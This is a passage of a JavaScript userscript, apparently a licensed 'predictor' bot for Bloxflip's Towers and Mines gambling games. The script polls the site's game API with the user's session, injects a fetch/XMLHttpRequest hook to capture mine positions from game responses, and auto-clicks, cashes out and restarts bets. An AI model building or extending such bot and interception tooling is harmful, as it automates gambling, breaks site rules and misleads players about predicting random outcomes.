 <div style="background:${CARD_BG};border:1px solid ${CARD_BORDER};border-radius:10px;padding:12px;text-align:center;">
 <div style="color:#555;font-size:10px;">To manage your license, use the Discord bot or contact support.</div>
 </div>`;
 }

 overlay.appendChild(modal);
 document.body.appendChild(overlay);
 modal.querySelector('#_01studios_t_modal_close')?.addEventListener('click', tCloseModal);

 if (type === 'heatmap') {
 modal.querySelector('#_01studios_t_heatmap_clear')?.addEventListener('click', () => {
 tSaveHistory(tDifficulty, []);
 tCloseModal();
 tUpdateStatus(`X History cleared for ${tDifficulty.toUpperCase()}`, '#888');
 });
 }

 if (type === 'settings') {
 let pendingAccent = accentColor;
 modal.querySelectorAll('._01studios_t_theme_swatch').forEach(sw => {
 sw.addEventListener('click', () => {
 pendingAccent = sw.dataset.color;
 modal.querySelectorAll('._01studios_t_theme_swatch').forEach(s => {
 s.style.border = s.dataset.color === pendingAccent ? '2px solid #fff' : '2px solid transparent';
 s.style.boxShadow = s.dataset.color === pendingAccent ? '0 0 0 1px ' + pendingAccent : 'none';
 });
 const cw = modal.querySelector('#_01studios_t_s_colorwheel');
 const ch = modal.querySelector('#_01studios_t_s_colorhex');
 if (cw) cw.value = pendingAccent;
 if (ch) { ch.textContent = pendingAccent; ch.style.color = pendingAccent; }
 });
 });
 const cw = modal.querySelector('#_01studios_t_s_colorwheel');
 const ch = modal.querySelector('#_01studios_t_s_colorhex');
 if (cw) cw.addEventListener('input', () => {
 pendingAccent = cw.value;
 if (ch) { ch.textContent = pendingAccent; ch.style.color = pendingAccent; }
 modal.querySelectorAll('._01studios_t_theme_swatch').forEach(s => { s.style.border = '2px solid transparent'; s.style.boxShadow = 'none'; });
 });
 modal.querySelector('#_01studios_t_reset_pos_btn')?.addEventListener('click', () => {
 localStorage.removeItem('_01studios_t_pos');
 const p = document.getElementById('_01studios_t_panel');
 if (p) { p.style.left = '20px'; p.style.top = '80px'; }
 tCloseModal();
 });
 modal.querySelector('#_01studios_t_settings_save')?.addEventListener('click', () => {
 accentColor = pendingAccent;
 localStorage.setItem('_01studios_accent', accentColor);
 settings.customAccent = pendingAccent;
 settings.predColor = pendingAccent;
 saveSettings();
 tCloseModal();
 tInjectStyles();
 tBuildGUI();
 setTimeout(() => {
 tUpdateAutoClickBtn();
 tUpdateAutoCashoutBtn();
 tUpdateAutoStartBtn();
 tUpdateModeButtons();
 tUpdateTargetButtons();
 if (tPrediction !== null) tDrawOverlay(tPrediction);
 }, 50);
 });
 }
 }

 function tCloseModal() { document.getElementById('_01studios_t_modal_overlay')?.remove(); }

 function tAttachEvents(panel) {
 panel.addEventListener('mousedown', e => { e.stopPropagation(); });
 panel.addEventListener('click', e => { e.stopPropagation(); });

 const header = panel.querySelector('#_01studios_t_header');
 if (header) {
 header.addEventListener('mousedown', e => {
 if (!e.isTrusted) return;
 if (e.target.tagName === 'BUTTON' || e.target.tagName === 'INPUT') return;
 tIsDragging = true;
 const r = panel.getBoundingClientRect();
 tDragOffX = e.clientX - r.left;
 tDragOffY = e.clientY - r.top;
 panel.style.transition = 'none';
 e.preventDefault();
 });
 }
 document.addEventListener('mousemove', e => {
 if (!tIsDragging || !e.isTrusted) return;
 e.preventDefault();
 const x = Math.max(0, Math.min(window.innerWidth - panel.offsetWidth, e.clientX - tDragOffX));
 const y = Math.max(0, Math.min(window.innerHeight - panel.offsetHeight, e.clientY - tDragOffY));
 panel.style.left = x + 'px';
 panel.style.top = y + 'px';
 });
 document.addEventListener('mouseup', e => {
 if (!e.isTrusted) return;
 if (tIsDragging) {
 tIsDragging = false;
 panel.style.transition = '';
 tSavePos(parseInt(panel.style.left), parseInt(panel.style.top));
 }
 });

         // Towers rain toggle
        var _tRainTgl = panel.querySelector('#_01studios_t_rain_toggle');
        if (_tRainTgl) _tRainTgl.addEventListener('click', function() {
            _rainAutoJoin = !_rainAutoJoin;
            this.style.background = _rainAutoJoin ? '#00c97a' : '#333';
            var th = this.querySelector('div'); if(th) th.style.left = _rainAutoJoin ? '18px' : '2px';
            var st = document.getElementById('_01studios_t_rain_status');
            if (st) { st.textContent = _rainAutoJoin ? 'Watching' : 'Off'; st.style.color = _rainAutoJoin ? '#00c97a' : '#e05555'; }
            // Sync mines
            var mSt = document.getElementById('_01studios_rain_status');
            if (mSt) { mSt.textContent = _rainAutoJoin ? 'Watching' : 'Off'; mSt.style.color = _rainAutoJoin ? '#00c97a' : '#e05555'; }
        });

        panel.querySelector('#_01studios_t_minimize')?.addEventListener('click', () => {
 tPanelMinimized = !tPanelMinimized;
 const body = panel.querySelector('#_01studios_t_body');
 if (body) body.style.display = tPanelMinimized ? 'none' : '';
 panel.querySelector('#_01studios_t_minimize').textContent = tPanelMinimized ? '+' : '−';
 });

 let tPassthrough = false;
 panel.querySelector('#_01studios_t_passthrough')?.addEventListener('click', () => {
 tPassthrough = !tPassthrough;
 if (tPassthrough) {
 panel.style.opacity = '0.15';
 panel.style.pointerEvents = 'none';
 const restoreBtn = document.createElement('button');
 restoreBtn.id = '_01studios_t_restore_btn';
 restoreBtn.textContent = '👁 SHOW PANEL';
 restoreBtn.style.cssText = `position:fixed;bottom:20px;right:20px;z-index:2147483648;background:${DARK_BG};border:1.5px solid ${accentColor};color:${accentColor};padding:8px 14px;border-radius:10px;cursor:pointer;font-size:11px;font-weight:700;font-family:'Segoe UI',sans-serif;box-shadow:0 4px 20px rgba(0,0,0,0.8);`;
 restoreBtn.addEventListener('click', () => {
 tPassthrough = false;
 panel.style.opacity = '1';
 panel.style.pointerEvents = '';
 restoreBtn.remove();
 });
 document.body.appendChild(restoreBtn);
 } else {
 panel.style.opacity = '1';
 panel.style.pointerEvents = '';
 document.getElementById('_01studios_t_restore_btn')?.remove();
 }
 });

 const menuBtn = panel.querySelector('#_01studios_t_menu_btn');
 const wheelPopup = panel.querySelector('#_01studios_t_wheel_popup');
 let wheelOpen = false;
 function toggleTWheel(e) {
 e.stopPropagation();
 wheelOpen = !wheelOpen;
 wheelPopup.style.display = wheelOpen ? 'block' : 'none';
 menuBtn.style.background = wheelOpen ? `linear-gradient(135deg,${accentColor}44,${accentColor}66)` : `linear-gradient(135deg,${accentColor}22,${accentColor}44)`;
 }
 function closeTWheel() { wheelOpen = false; wheelPopup.style.display = 'none'; menuBtn.style.background = `linear-gradient(135deg,${accentColor}22,${accentColor}44)`; }
 menuBtn?.addEventListener('click', toggleTWheel);
 panel.querySelectorAll('._01studios_t_wheel_item').forEach(item => {
 item.addEventListener('mouseenter', () => { item.style.background = '#1a1a1a'; item.style.borderColor = '#333'; });
 item.addEventListener('mouseleave', () => { item.style.background = 'transparent'; item.style.borderColor = 'transparent'; });
 item.addEventListener('click', () => { closeTWheel(); tOpenModal(item.dataset.action); });
 });
 document.addEventListener('click', e => {
 if (!panel.querySelector('#_01studios_t_wheel_wrap')?.contains(e.target)) closeTWheel();
 });

 panel.querySelectorAll('._01studios_t_mode_btn').forEach(btn => btn.addEventListener('click', () => {
 tCurrentMode = btn.dataset.mode;
 tUpdateModeButtons();
 if (tGame && tGame.active && !tGame.exploded) {
 tPredict(tGame.uuid, tGame.difficulty, tGame.completedLevels || []).then(function(p) {
 tPrediction = p;
 tPredRow = (tGame.completedLevels || []).length;
 tInjectStyles(); tDrawOverlay(tPrediction); tUpdateGrid(); tUpdateStats();
 }).catch(function(e) { console.error('[01S] Towers predict error:', e); });
 }
 }));

 panel.querySelectorAll('._01studios_t_tgt_btn').forEach(btn => btn.addEventListener('click', () => {
 tAutoTarget = parseInt(btn.dataset.n);
 tUpdateTargetButtons();
 }));

 panel.querySelector('#_01studios_t_autoclick')?.addEventListener('click', tToggleAutoClick);
 panel.querySelector('#_01studios_t_autocashout')?.addEventListener('click', tToggleAutoCashout);
 panel.querySelector('#_01studios_t_autostart')?.addEventListener('click', tToggleAutoStart);

 panel.querySelector('#_01studios_t_newgame')?.addEventListener('click', () => {
 tGame = null; tLastUUID = null; tGameRunning = false;
 tPrediction = null; tPredRow = -1; tLastCompletedLevels = [];
 tClearOverlay(); tUpdateGrid(); tUpdateStats();
 tUpdateStatus('Ready — waiting for game...', TEXT_DIM);
 });

 panel.querySelector('#_01studios_t_base_bet')?.addEventListener('change', e => {
 tBetAmount = parseFloat(e.target.value) || 25;
 });
 panel.querySelector('#_01studios_t_stop_loss')?.addEventListener('change', e => {
 settings.tStopLoss = parseFloat(e.target.value) || 0;
 saveSettings();
 });
 panel.querySelector('#_01studios_t_take_profit')?.addEventListener('change', e => {
 settings.tTakeProfit = parseFloat(e.target.value) || 0;
 saveSettings();
 });

 const ridBtn = panel.querySelector('#_01studios_t_round_id');
 if (ridBtn) {
 ridBtn.addEventListener('click', () => {
 const uuid = tLastUUID;
 if (!uuid) { tUpdateStatus('No round ID yet — start a game first.', TEXT_DIM); return; }
 const notif = document.createElement('div');
 notif.style.cssText = `position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:#1a1a1a;border:1px solid ${accentColor}44;color:${accentColor};padding:10px 18px;border-radius:10px;font-size:11px;font-family:monospace;z-index:2147483648;box-shadow:0 4px 20px rgba(0,0,0,0.8);letter-spacing:1px;cursor:pointer;`;
 notif.textContent = uuid;
 notif.title = 'Click to copy';
 notif.addEventListener('click', () => { navigator.clipboard.writeText(uuid).catch(()=>{}); notif.textContent = 'Copied!'; setTimeout(()=>notif.remove(), 1000); });
 document.body.appendChild(notif);
 setTimeout(() => notif.remove(), 4000);
 });
 }
 }

 let _tInterceptorInjected = false;
 function tInjectFetchInterceptor() {
 if (_tInterceptorInjected) return;
 _tInterceptorInjected = true;
 const script = document.createElement('script');
 script.textContent = `(function() {
 if (window._tFetchIntercepted) return;
 window._tFetchIntercepted = true;
 window._tActionExploded = null;

 const _origFetch = window.fetch;
 window.fetch = async function(...args) {
 const url = typeof args[0] === 'string' ? args[0] : (args[0] && args[0].url) || '';
 const response = await _origFetch.apply(this, args);
 if (url.includes('/api/games/towers/action')) {
 try {
 const clone = response.clone();
 clone.json().then(data => {
 if (data && typeof data.exploded !== 'undefined') {
 window._tActionExploded = data.exploded;
 if (data.exploded && typeof data.mineTileIndex !== 'undefined') {
 window._tActionMineCol = data.mineTileIndex;
 }
 }
 }).catch(() => {});
 } catch(e) {}
 }
 return response;
 };

 const _origOpen = XMLHttpRequest.prototype.open;
 const _origSend = XMLHttpRequest.prototype.send;
 XMLHttpRequest.prototype.open = function(method, url, ...rest) {
 this._tUrl = url;
 return _origOpen.apply(this, [method, url, ...rest]);
 };
 XMLHttpRequest.prototype.send = function(...args) {
 if (this._tUrl && this._tUrl.includes('/api/games/towers/action')) {
 this.addEventListener('load', function() {
 try {
 const data = JSON.parse(this.responseText);
 if (data && typeof data.exploded !== 'undefined') {
 window._tActionExploded = data.exploded;
 if (data.exploded && typeof data.mineTileIndex !== 'undefined') {
 window._tActionMineCol = data.mineTileIndex;
 }
 }
 } catch(e) {}
 });
 }
 return _origSend.apply(this, args);
 };
 })();`;
 (document.head || document.documentElement).appendChild(script);
 script.remove();
 }

 const _uw = (typeof unsafeWindow !== 'undefined') ? unsafeWindow : window;
 function tGetActionExploded() {
 try { return _uw._tActionExploded; } catch(e) { return null; }
 }
 function tGetActionMineCol() {
 try { return typeof _uw._tActionMineCol !== 'undefined' ? _uw._tActionMineCol : null; } catch(e) { return null; }
 }
 function tResetActionExploded() {
 try { _uw._tActionExploded = null; _uw._tActionMineCol = null; } catch(e) {}
 }

 function tStartPoller() {
 if (tPoller) clearInterval(tPoller);
 tPoller = setInterval(tPoll, 350);
 }

 async function tPoll() {
 try {
 const res = await fetch('https://bloxflip.com/api/games/towers', { credentials: 'include' });
 if (!res.ok) return;
 const data = await res.json();
 if (!data.success) return;

 if (!data.hasGame) {
 if (tGameRunning && !tResultRecorded) {
 tResultRecorded = true;
 tGameRunning = false;
 tAutoClickActive = false;
 const prevLevels = tLastCompletedLevels.length;
 const prevBet = tBetAmount;
 const prevMults = T_MULTS[tDifficulty] || T_MULTS.easy;
 const prevMult = prevMults[Math.min(prevLevels, prevMults.length - 1)] || 1;

 const actionExploded = tGetActionExploded();
 const actionMineCol = tGetActionMineCol();
 const isLoss = actionExploded === true || (actionExploded === null && !tLastCashedOut);

 if (isLoss) {
 tLosses++; tLossStreak++; tWinStreak = 0;
 tProfit -= prevBet;
 tAnalyticsLog.push({ time: new Date().toLocaleTimeString(), result: 'loss', difficulty: tDifficulty, rows: prevLevels, mult: prevMult, bet: prevBet, uuid: tLastUUID });
 if (tLastCompletedLevels.length > 0) tLastCompletedLevels.forEach((col, rowIdx) => tRecordRound(tDifficulty, col, 'win', rowIdx));
 if (actionMineCol !== null) tRecordRound(tDifficulty, -1, 'loss', prevLevels, actionMineCol);
 tUpdateStats();
 tUpdateStatus(` Hit mine — ${prevLevels} rows cleared · Loss streak: ${tLossStreak}`, '#e05555');
 } else {
 tWins++; tWinStreak++; tLossStreak = 0;
 const payout = prevBet * prevMult;
 tProfit += payout - prevBet;
 tAnalyticsLog.push({ time: new Date().toLocaleTimeString(), result: 'win', difficulty: tDifficulty, rows: prevLevels, mult: prevMult, bet: prevBet, uuid: tLastUUID });
 tLastCompletedLevels.forEach((col, rowIdx) => tRecordRound(tDifficulty, col, 'win', rowIdx));
 tUpdateStats();
 tUpdateStatus(`OK Cashed out — ${prevMult.toFixed(2)}x · Win streak: ${tWinStreak}`, '#00c97a');
 }
 const badge = document.getElementById('_01studios_t_live_badge');
 if (badge) badge.style.display = 'none';
 tPrediction = null; tClearOverlay(); tUpdateGrid();
 tAutoClickPending = false;
 tAutoClickActive = false;
 tLastCashedOut = false;
 tResetActionExploded();
 if (tAutoStartEnabled) setTimeout(tPerformAutoStart, 1500);
 }
 return;
 }

 const game = data.game;
 const uuid = game.uuid;
 const active = game.active;
 const exploded = game.exploded;
 const completedLevels = game.completedLevels || [];
 const difficulty = game.difficulty || 'easy';
 const betAmount = game.betAmount || tBetAmount;

 if (uuid !== tLastUUID) {
 tLastUUID = uuid;
 _sessionGamesPlayed++;
 tGame = game;
 tCurrentGameData = game;
 tGameRunning = active && !exploded;
 tLastExploded = exploded || false;
 tResultRecorded = false;
 tLastCashedOut = false;
 tResetActionExploded();
 tDifficulty = difficulty;
 tBetAmount = betAmount;
 tLastCompletedLevels = [...completedLevels];
 tPredRow = -1;

 if (tGameRunning) {
 tPredict(uuid, difficulty, completedLevels).then(function(p) {
 tPrediction = p;
 tPredRow = completedLevels.length;
 tAutoClickPending = true;
 tAutoClickActive = false;
 tInjectStyles(); tDrawOverlay(tPrediction); tUpdateGrid(); tUpdateStats();
 }).catch(function(e) { console.error('[01S] Towers predict error:', e); });
 tInjectStyles();
 tBuildGUI();
 tUpdateStats();
 tUpdateStatus(`LIVE GAME — ${difficulty.toUpperCase()} · ${(T_DIFF[difficulty]||T_DIFF.easy).cols} cols`, '#00c97a');
 const badge = document.getElementById('_01studios_t_live_badge');
 if (badge) badge.style.display = 'block';
 setTimeout(() => {
 tDrawOverlay(tPrediction);
 if (tAutoClickEnabled) tDoAutoClick();
 }, 400);
 } else {
 tPrediction = null;
 tAutoClickPending = false;
 tClearOverlay();
 tBuildGUI();
 tUpdateStats();
 }
 return;
 }

 const prevLevels = tLastCompletedLevels.length;
 const curLevels = completedLevels.length;
 const levelAdvanced = curLevels > prevLevels;
 const justExploded = exploded && !tLastExploded;

 tGame = game;
 tCurrentGameData = game;
 tDifficulty = difficulty;
 tBetAmount = betAmount;
 if (exploded) tLastExploded = true;

 if (justExploded && !tResultRecorded) {
 tResultRecorded = true;
 tGameRunning = false;
 tAutoClickActive = false;
 tAutoClickPending = false;
 const actionMineCol = tGetActionMineCol();
 tResetActionExploded();
 tLosses++; tLossStreak++; tWinStreak = 0;
 tProfit -= betAmount;
 tAnalyticsLog.push({ time: new Date().toLocaleTimeString(), result: 'loss', difficulty, rows: curLevels, mult: T_MULTS[difficulty]?.[Math.min(curLevels, (T_MULTS[difficulty]?.length||1)-1)] || 1, bet: betAmount, uuid });
 if (completedLevels.length > 0) completedLevels.forEach((col, rowIdx) => tRecordRound(difficulty, col, 'win', rowIdx));
 if (actionMineCol !== null) tRecordRound(difficulty, -1, 'loss', curLevels, actionMineCol);
 tPrediction = null; tClearOverlay(); tUpdateGrid(); tUpdateStats();
 tUpdateStatus(` Hit mine — ${curLevels} rows cleared · Loss streak: ${tLossStreak}`, '#e05555');
 const badge = document.getElementById('_01studios_t_live_badge');
 if (badge) badge.style.display = 'none';
 if (tAutoStartEnabled) setTimeout(tPerformAutoStart, 1500);
 return;
 }

 if (!active && !exploded && tGameRunning && !tResultRecorded) {
 tResultRecorded = true;
 tGameRunning = false;
 tAutoClickActive = false;
 tAutoClickPending = false;
 tResetActionExploded();
 tWins++; tWinStreak++; tLossStreak = 0;
 const mults = T_MULTS[difficulty] || T_MULTS.easy;
 const mult = mults[Math.min(curLevels, mults.length - 1)] || 1;
 const payout = betAmount * mult;
 tProfit += payout - betAmount;
 tAnalyticsLog.push({ time: new Date().toLocaleTimeString(), result: 'win', difficulty, rows: curLevels, mult, bet: betAmount, uuid });
 if (completedLevels.length > 0) completedLevels.forEach((col, rowIdx) => tRecordRound(difficulty, col, 'win', rowIdx));
 tPrediction = null; tClearOverlay(); tUpdateGrid(); tUpdateStats();
 tUpdateStatus(`OK Cashed out — ${mult.toFixed(2)}x · Win streak: ${tWinStreak}`, '#00c97a');
 const badge2 = document.getElementById('_01studios_t_live_badge');
 if (badge2) badge2.style.display = 'none';
 if (tAutoStartEnabled) setTimeout(tPerformAutoStart, 1500);
 return;
 }

 if (levelAdvanced) {
 tLastCompletedLevels = [...completedLevels];
 tAutoClickPending = false;
 tAutoClickActive = false;
 tPredict(uuid, difficulty, completedLevels).then(function(p) {
 tPrediction = p;
 tPredRow = curLevels;
 tInjectStyles(); tDrawOverlay(tPrediction); tUpdateGrid(); tUpdateStats();
 }).catch(function(e) { console.error('[01S] Towers predict error:', e); });
 tUpdateStatus(`\u25cf Row ${curLevels} cleared \u2014 predicting row ${curLevels + 1}...`, '#00c97a');

 if (tAutoCashoutEnabled && curLevels >= tAutoTarget) {
 setTimeout(tPerformCashout, 300);
 return;
 }
 if (tAutoClickEnabled) setTimeout(tDoAutoClick, 450);
 return;
 }

 if (active && !exploded && tPrediction !== null) {
 if (!document.querySelector('._01studios_t_marker')) {
 tInjectStyles(); tDrawOverlay(tPrediction);
 }
 }

 if (tAutoClickEnabled && active && !exploded && tAutoClickPending && !tAutoClickActive) {
 tAutoClickPending = false;
 tDoAutoClick();
 }

 } catch (e) { }
 }

 function launchTowersApp() {
 tGame = null; tLastUUID = null; tGameRunning = false;
 tPrediction = null; tPredRow = -1;
 tAutoClickEnabled = false; tAutoCashoutEnabled = false; tAutoStartEnabled = false;
 tAutoClickActive = false; tAutoClickPending = false;
 tWins = 0; tLosses = 0; tProfit = 0; tWinStreak = 0; tLossStreak = 0;
 tAnalyticsLog = []; tCurrentGameData = null; tLastCompletedLevels = [];
 tLastExploded = false; tResultRecorded = false;
 tLastCashedOut = false;
 tAutoTarget = 3; tCurrentMode = 'smart';
 tDifficulty = 'easy';
 tInjectFetchInterceptor();
 tInjectStyles();
 tBuildGUI();
 tStartPoller();
 }

 let _lastPath = window.location.pathname;
 setInterval(() => {
 const p = window.location.pathname;
 if (p !== _lastPath) {
 _lastPath = p;
 if (p.includes('/mines') || p.includes('/towers')) {
 if (p.includes('/mines')) {
 document.getElementById('_01studios_t_panel')?.remove();
 if (tPoller) { clearInterval(tPoller); tPoller = null; }
 } else {
 document.getElementById('_01studios_panel')?.remove();
 if (_minesPoller) { clearInterval(_minesPoller); _minesPoller = null; }
 }
 _launched = false;
 if (_01_predictorReady) { setTimeout(init, 500); setTimeout(init, 1500); }
 }
 }
 }, 500);

})();
